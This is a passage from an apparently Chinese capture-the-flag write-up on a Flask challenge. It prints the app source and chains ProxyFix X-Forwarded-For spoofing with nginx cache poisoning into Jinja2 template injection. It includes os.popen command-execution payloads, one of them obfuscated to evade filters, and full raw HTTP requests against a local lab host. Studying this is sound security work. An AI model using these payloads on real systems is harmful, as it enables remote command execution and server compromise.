}}"</span>render_template_string<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 执行系统命令并返回结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token punctuation">(</span>    Flask<span class="token punctuation">,</span>    render_template<span class="token punctuation">,</span>    request<span class="token punctuation">,</span>    redirect<span class="token punctuation">,</span>    url_for<span class="token punctuation">,</span>    render_template_string<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemy<span class="token keyword">from</span> flask_login <span class="token keyword">import</span> <span class="token punctuation">(</span>    LoginManager<span class="token punctuation">,</span>    UserMixin<span class="token punctuation">,</span>    login_user<span class="token punctuation">,</span>    login_required<span class="token punctuation">,</span>    logout_user<span class="token punctuation">,</span>    current_user<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> DeclarativeBase<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> Mapped<span class="token punctuation">,</span> mapped_column<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>security <span class="token keyword">import</span> generate_password_hash<span class="token punctuation">,</span> check_password_hash<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>middleware<span class="token punctuation">.</span>proxy_fix <span class="token keyword">import</span> ProxyFix<span class="token keyword">import</span> geoip2<span class="token punctuation">.</span>database<span class="token keyword">class</span> <span class="token class-name">Base</span><span class="token punctuation">(</span>DeclarativeBase<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span>db <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span>model_class<span class="token operator">=</span>Base<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">,</span> UserMixin<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">id</span><span class="token punctuation">:</span> Mapped<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token operator">=</span> mapped_column<span class="token punctuation">(</span>primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    username<span class="token punctuation">:</span> Mapped<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> mapped_column<span class="token punctuation">(</span>unique<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    password<span class="token punctuation">:</span> Mapped<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> mapped_column<span class="token punctuation">(</span><span class="token punctuation">)</span>    bio<span class="token punctuation">:</span> Mapped<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> mapped_column<span class="token punctuation">(</span><span class="token punctuation">)</span>    last_ip<span class="token punctuation">:</span> Mapped<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> mapped_column<span class="token punctuation">(</span>nullable<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">set_password</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>password <span class="token operator">=</span> generate_password_hash<span class="token punctuation">(</span>password<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_password</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> check_password_hash<span class="token punctuation">(</span>self<span class="token punctuation">.</span>password<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"&lt;User %r&gt;"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>nameapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"SQLALCHEMY_DATABASE_URI"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"sqlite:///data.db"</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"SECRET_KEY"</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>wsgi_app <span class="token operator">=</span> ProxyFix<span class="token punctuation">(</span>app<span class="token punctuation">.</span>wsgi_app<span class="token punctuation">)</span>db<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">with</span> app<span class="token punctuation">.</span>app_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span><span class="token punctuation">)</span>login_manager <span class="token operator">=</span> LoginManager<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gen_random_string</span><span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">,</span> k<span class="token operator">=</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_manager<span class="token punctuation">.</span>user_loader</span><span class="token keyword">def</span> <span class="token function">load_user</span><span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> user<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">route_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Invalid username or password."</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">and</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>            login_user<span class="token punctuation">(</span>user<span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"route_profile"</span><span class="token punctuation">,</span> username<span class="token operator">=</span>user<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Invalid username or password."</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">route_logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">route_register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>        bio <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"bio"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Invalid username or password."</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Username already exists."</span>        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">,</span> bio<span class="token operator">=</span>bio<span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>password<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"route_login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"register.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/&lt;string:username&gt;"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">route_profile</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"profile.html"</span><span class="token punctuation">,</span> user<span class="token operator">=</span>user<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/get_last_ip/&lt;string:username&gt;"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">route_check_ip</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"You need to login first."</span>    user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"User not found."</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"last_ip.html"</span><span class="token punctuation">,</span> last_ip<span class="token operator">=</span>user<span class="token punctuation">.</span>last_ip<span class="token punctuation">)</span>geoip2_reader <span class="token operator">=</span> geoip2<span class="token punctuation">.</span>database<span class="token punctuation">.</span>Reader<span class="token punctuation">(</span><span class="token string">"GeoLite2-Country.mmdb"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/ip_detail/&lt;string:username&gt;"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">route_ip_detail</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://127.0.0.1/get_last_ip/</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Get last ip failed."</span>    last_ip <span class="token operator">=</span> res<span class="token punctuation">.</span>text    <span class="token keyword">try</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"\d+\.\d+\.\d+\.\d+"</span><span class="token punctuation">,</span> last_ip<span class="token punctuation">)</span>        country <span class="token operator">=</span> geoip2_reader<span class="token punctuation">.</span>country<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span><span class="token punctuation">:</span>        country <span class="token operator">=</span> <span class="token string">"Unknown"</span>    template <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""    &lt;h1&gt;IP Detail&lt;/h1&gt;    &lt;div&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>last_ip<span class="token punctuation">}</span></span><span class="token string">&lt;/div&gt;    &lt;p&gt;Country:</span><span class="token interpolation"><span class="token punctuation">{</span>country<span class="token punctuation">}</span></span><span class="token string">&lt;/p&gt;    """</span></span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span><span class="token keyword">def</span> <span class="token function">set_last_ip</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        current_user<span class="token punctuation">.</span>last_ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此路由二次渲染last_ip,如果last_ip可控会造成模板注入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/ip_detail/&lt;string:username&gt;"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">route_ip_detail</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://127.0.0.1/get_last_ip/</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Get last ip failed."</span>    last_ip <span class="token operator">=</span> res<span class="token punctuation">.</span>text    <span class="token keyword">try</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"\d+\.\d+\.\d+\.\d+"</span><span class="token punctuation">,</span> last_ip<span class="token punctuation">)</span>        country <span class="token operator">=</span> geoip2_reader<span class="token punctuation">.</span>country<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span><span class="token punctuation">:</span>        country <span class="token operator">=</span> <span class="token string">"Unknown"</span>    template <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""    &lt;h1&gt;IP Detail&lt;/h1&gt;    &lt;div&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>last_ip<span class="token punctuation">}</span></span><span class="token string">&lt;/div&gt;    &lt;p&gt;Country:</span><span class="token interpolation"><span class="token punctuation">{</span>country<span class="token punctuation">}</span></span><span class="token string">&lt;/p&gt;    """</span></span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应用使用了ProxyFix中间件</p><pre class="line-numbers language-none"><code class="language-none">from werkzeug.middleware.proxy_fix import ProxyFixapp.wsgi_app = ProxyFix(app.wsgi_app)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ProxyFix中间件的作用是从代理服务器传递的请求头中获取客户端的真实IP地址。当请求经过代理（如Nginx）时，原始客户端的IP会被保存在X-Forwarded-For头中。通过设置ProxyFix中间件，Flask的request.remote_addr将不再使用直接连接的客户端IP（通常是代理服务器的IP），而是使用X-Forwarded-For请求头中的IP地址。</p><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: 127.0.0.1 {%set ca=e|slice(16)|string|batch(16)|first|last+e|slice(7)|string|batch(7)|first|last+e|slice(8)|string|batch(8)|first|last+e|slice(11)|string|batch(11)|first|last+cycler.__doc__[697]+e|pprint|lower|batch(5)|first|last+e|slice(28)|string|batch(28)|first|last+e|slice(7)|string|batch(7)|first|last+e|slice(2)|string|batch(2)|first|last%}{{(sbwaf.__eq__.__globals__.sys.modules.os.popen(ca)).read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置文件中有如下内容</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">location</span> ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$</span> <span class="token punctuation">{</span>    <span class="token directive"><span class="token keyword">proxy_ignore_headers</span> Cache-Control Expires Vary Set-Cookie</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">proxy_pass</span> http://127.0.0.1:5000</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">proxy_cache</span> static</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">proxy_cache_valid</span> <span class="token number">200</span> <span class="token number">302</span> <span class="token number">30d</span></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token directive"><span class="token keyword">location</span> ~ .*\.(js|css)?$</span> <span class="token punctuation">{</span>    <span class="token directive"><span class="token keyword">proxy_ignore_headers</span> Cache-Control Expires Vary Set-Cookie</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">proxy_pass</span> http://127.0.0.1:5000</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">proxy_cache</span> static</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">proxy_cache_valid</span> <span class="token number">200</span> <span class="token number">302</span> <span class="token number">12h</span></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>current_user.last_ip = request.remote_addr</code>于是要记得访问”<code>/xxx.js</code>“</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span><span class="token keyword">def</span> <span class="token function">set_last_ip</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 检查用户是否已登录（通过 Flask-Login 的 current_user 实现）</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token comment"># 将当前请求的客户端 IP 记录为用户的 last_ip</span>        current_user<span class="token punctuation">.</span>last_ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        <span class="token comment"># 提交数据库会话，保存修改</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 返回响应（不改变原始响应内容）</span>    <span class="token keyword">return</span> response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务器设置了缓存所有以.js结尾的响应,同时注册功能没有限制用户名中的特殊字符,这使得我们可以构造特殊的用户名,例如:username.js。当我们注册完成后先向<code>/</code>发送带有<code>X-Forwarded-For:xxx</code>的请求，再向<code>/get_last_ip/username.js</code>发送请求,服务器返回的响应会被缓存,无论接下来的请求是否携带cookie,只要路径相同,返回的结果都会是相同的。<code>/ip_detail</code>路由内部向<code>/get_last_ip</code>发送的请求即使不携带cookie也会返回我们给予的last_ip。</p><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}X-Forwarded-For: {{ config.__class__.__init__.__globals__[request.args.os].popen(request.args.a).read() }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>五步走</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f05e6840ae1351ea961854c6b302706b.png"></p><pre class="line-numbers language-none"><code class="language-none">1、POST /register HTTP/1.1Host: 127.0.0.1:8081Content-Length: 50Cache-Control: max-age=0sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"Accept-Language: zh-CNUpgrade-Insecure-Requests: 1Origin: http://127.0.0.1:8081Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1:8081/registerAccept-Encoding: gzip, deflate, brCookie: session=.eJwljjEOAjEMBP_imsJO7MS5zyDHsQUS1Z2oEH8nEsU2u7PSfOCeZ1wPONJeV9zg_lxwgDsqE7P5dJlEiJ5O04tkzbYjYtNKtuWqWpBMBorVFsYx2mDBhYu7UlJ4MO3XzBDtuos9CK2hSLP3rIQlzZEEN4EpdTBskfcV599G4fsDIoovpA.aHXdQg.gjgdpHxTZo4pCAURSMOuKxTS8uAConnection: keep-aliveusername=user14.gif&amp;password=1&amp;bio=1&amp;submit=Sign+Up2、POST /login HTTP/1.1Host: 127.0.0.1:8081Content-Length: 39X-Forwarded-For: {{ config.__class__.__init__.__globals__[request.args.os].popen(request.args.a).read() }}Cache-Control: max-age=0sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"Accept-Language: zh-CNUpgrade-Insecure-Requests: 1Origin: http://127.0.0.1:8081Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1:8081/loginAccept-Encoding: gzip, deflate, brConnection: keep-aliveusername=user14.gif&amp;password=1&amp;submit=Log+In3、(没有也行)GET /user14.gif HTTP/1.1Host: 127.0.0.1:8081X-Forwarded-For: {{ config.__class__.__init__.__globals__[request.args.os].popen(request.args.a).read() }}Cookie:{{Cookie}}sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"Accept-Language: zh-CNUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brConnection: keep-alive4、（检查）GET /get_last_ip/user14.gif HTTP/1.1Host: 127.0.0.1:8081X-Forwarded-For: {{ config.__class__.__init__.__globals__[request.args.os].popen(request.args.a).read() }}sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"Accept-Language: zh-CNUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brCookie: 